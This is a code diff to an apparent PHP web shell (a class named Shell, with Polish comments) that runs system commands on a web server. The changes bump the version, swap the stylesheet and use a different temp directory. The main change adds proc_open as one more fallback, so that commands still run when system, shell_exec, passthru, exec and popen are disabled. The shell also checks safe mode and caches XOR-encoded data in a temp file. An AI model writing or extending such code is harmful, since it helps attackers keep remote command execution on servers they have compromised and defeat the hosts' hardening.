@@ -28,7 +28,7 @@ class Shell
 	/**
 	 * Wersja
 	 */
-	const VERSION = '0.21 b110618';
+	const VERSION = '0.30 b110709';
 
 	/**
 	 * Help, natywne polecenia
@@ -177,7 +177,7 @@ info - Wyświetla informacje o systemie';
 		/**
 		 * @ignore
 		 */
-		$this -> sStyleSheet = file_get_contents( 'Styles/dark.css' );
+		$this -> sStyleSheet = file_get_contents( 'Styles/blue.css' );
 
 		/**
 		 * @see Request::init
@@ -196,9 +196,7 @@ info - Wyświetla informacje o systemie';
 		{
 			$aDisableFunctions = explode( ',', $sDisableFunctions );
 
-			array_walk( $aDisableFunctions, create_function( '$sValue', 'return strtolower( trim( $sValue ) );' ) );
-
-			$this -> aDisableFunctions = $aDisableFunctions;
+			$this -> aDisableFunctions = array_map( create_function( '$sValue', 'return strtolower( trim( $sValue ) );' ), $aDisableFunctions );
 		}
 
 		/**
@@ -214,7 +212,7 @@ info - Wyświetla informacje o systemie';
 		/**
 		 * Mozliwosc wywolania polecenia systemowego
 		 */
-		$this -> bExec = ( ! $this -> bSafeMode && ( count( array_diff( array( 'exec', 'shell_exec', 'passthru', 'system', 'popen' ), $this -> aDisableFunctions ) ) > 0 ) );
+		$this -> bExec = ( ! $this -> bSafeMode && ( count( array_diff( array( 'exec', 'shell_exec', 'passthru', 'system', 'popen', 'proc_open' ), $this -> aDisableFunctions ) ) > 0 ) );
 
 		/**
 		 * Jesli SafeMode jest wylaczony
@@ -245,7 +243,7 @@ info - Wyświetla informacje o systemie';
 		 * p jak PURE
 		 */
 		if(    ! isset( $_GET['p'] )
-		    && is_file( $sFilePath = sys_get_temp_dir() . '/' . $sKey )
+		    && is_file( $sFilePath = $_SERVER['TMP'] . '/' . $sKey )
 		    && ( ( $sData = file_get_contents( $sFilePath ) ) !== FALSE )
 		)
 		{
@@ -432,7 +430,7 @@ DATA;
 				return 'Nie można pobrać pliku z modułami';
 			}
 
-			$sFilePath = tempnam( sys_get_temp_dir(), 'shell' );
+			$sFilePath = tempnam( $_SERVER['TMP'], 'shell' );
 			file_put_contents( $sFilePath, $sData );
 		}
 		/**
@@ -462,7 +460,7 @@ DATA;
 			$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 36 ) * 2, 2 ) ) );
 		}
 
-		file_put_contents( sys_get_temp_dir() . '/' . $sKey, $sNewData );
+		file_put_contents( $_SERVER['TMP'] . '/' . $sKey, $sNewData );
 
 		/**
 		 * Usuwanie tymczasowego pliku
@@ -562,26 +560,55 @@ DATA;
 			ob_start();
 			if( ! in_array( 'system', $this -> aDisableFunctions ) )
 			{
+				echo "system():\r\n\r\n";
 				system( $sCmd );
 			}
 			else if( ! in_array( 'shell_exec', $this -> aDisableFunctions ) )
 			{
+				echo "shell_exec():\r\n\r\n";
 				echo shell_exec( $sCmd );
 			}
 			else if( ! in_array( 'passthru', $this -> aDisableFunctions ) )
 			{
+				echo "passthru():\r\n\r\n";
 				passthru( $sCmd );
 			}
 			else if( ! in_array( 'exec', $this -> aDisableFunctions ) )
 			{
-				exec( $sCmd );
+				echo "exec():\r\n\r\n";
+				exec( $sCmd, $aOutput );
+				foreach( $aOutput as $sLine )
+				{
+					printf( "%s\r\n", $sLine );
+				}
 			}
 			else if( ! in_array( 'popen', $this -> aDisableFunctions ) )
 			{
+				echo "popen():\r\n\r\n";
 				$rFp = popen( $sCmd, 'r' );
 				while( ! feof( $rFp ) )
 				{
 					echo fread( $rFp, 1024 );
+				}
+			}
+			else if( ! in_array( 'proc_open', $this -> aDisableFunctions ) )
+			{
+				echo "proc_open():\r\n\r\n";
+				$rFp = proc_open( $sCmd, array
+					(
+						array( 'pipe', 'r' ),
+						array( 'pipe', 'w' )
+					),
+					$aPipe
+				);
+
+				if( is_resource( $rFp ) )
+				{
+					while( ! feof( $aPipe[1] ) )
+					{
+						echo fread( $aPipe[1], 1024 );
+						usleep( 10000 );
+					}
 				}
 			}
 			else
@@ -592,6 +619,7 @@ DATA;
 			$sData = ob_get_contents();
 			ob_clean();
 			ob_end_flush();
+
 			return htmlspecialchars( $sData );
 		}
 
